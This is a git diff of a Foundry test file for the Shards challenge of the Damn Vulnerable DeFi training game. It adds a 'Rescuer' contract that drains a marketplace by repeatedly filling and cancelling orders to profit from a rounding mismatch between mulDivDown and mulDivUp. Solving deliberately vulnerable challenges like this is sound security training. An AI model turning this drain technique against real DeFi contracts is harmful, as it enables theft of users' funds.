@@ -14,8 +14,6 @@ import {
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
 contract ShardsChallenge is Test {
-    using FixedPointMathLib for uint256;
-
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address seller = makeAddr("seller");
@@ -119,21 +117,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        // uint256 price = uint256(NFT_OFFER_PRICE).mulDivDown(MARKETPLACE_INITIAL_RATE, 1e6);
-        // uint256 tokenNeeded = want.mulDivDown(price, NFT_OFFER_SHARDS);
-        // console.log("Tokens needed:", tokenNeeded);
-
-        for (uint256 i = 0; i < 1000; i++) {
-            uint256 want = 129;
-            token.approve(address(marketplace), type(uint256).max);
-
-            uint256 purchasedIndex = marketplace.fill(1, want);
-
-            marketplace.cancel(1, purchasedIndex);
-        }
-
-        console.log("token balance of player", token.balanceOf(player));
-
+        new Rescuer(marketplace, token, recovery);
     }
 
     /**
@@ -154,4 +138,61 @@ contract ShardsChallenge is Test {
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
     }
+}
+
+
+contract Rescuer{
+    using FixedPointMathLib for uint256;
+
+    uint256 constant STAKING_REWARDS = 100_000e18;
+    uint256 constant NFT_SUPPLY = 50;
+    uint256 constant SELLER_NFT_BALANCE = 1;
+    uint256 constant SELLER_DVT_BALANCE = 75e19;
+    uint256 constant STAKING_RATE = 1e18;
+    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
+    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
+    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;
+
+    constructor(
+                ShardsNFTMarketplace marketplace,
+                DamnValuableToken token,
+                address recovery
+    ){
+
+        // Token payment needed in `ShardsNFTMarketplace#fill`, use this to find the inital value which makes the following 0
+        // want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS
+
+        // Token received in `ShardsNFTMarketplace#cancel`
+        // want * MARKETPLACE_INITIAL_RATE / 1e6
+
+        // Profit due to how truncation is used in `fill` (using `mulDivDown`) and `cancel` (using `mulDivUp`):
+        // profit = ( want * MARKETPLACE_INITIAL_RATE / 1e6 ) - ( want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS )
+
+        token.approve(address(marketplace), type(uint256).max);
+
+        uint256 want = 132;
+        while (true) {
+            uint256 purchasedIndex = marketplace.fill(1, want);
+            marketplace.cancel(1, purchasedIndex);
+            uint256 balance = token.balanceOf(address(this));
+            // want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS = balance
+            // want = balance * NFT_OFFER_SHARDS / (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6)
+            want = balance.mulDivUp(NFT_OFFER_SHARDS, (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6)) - 1;
+            uint256 profit = ( want * MARKETPLACE_INITIAL_RATE / 1e6 ) - ( want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS );
+            while(profit > token.balanceOf(address(marketplace))) { // profit can be larger than what's left in the marketplace
+                want = want / 2;
+                profit = ( want * MARKETPLACE_INITIAL_RATE / 1e6 ) - ( want * (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6) / NFT_OFFER_SHARDS );
+                if (want == 0){
+                    break;
+                }
+            }
+            if (want == 0){
+                break;
+            }
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+
+
 }
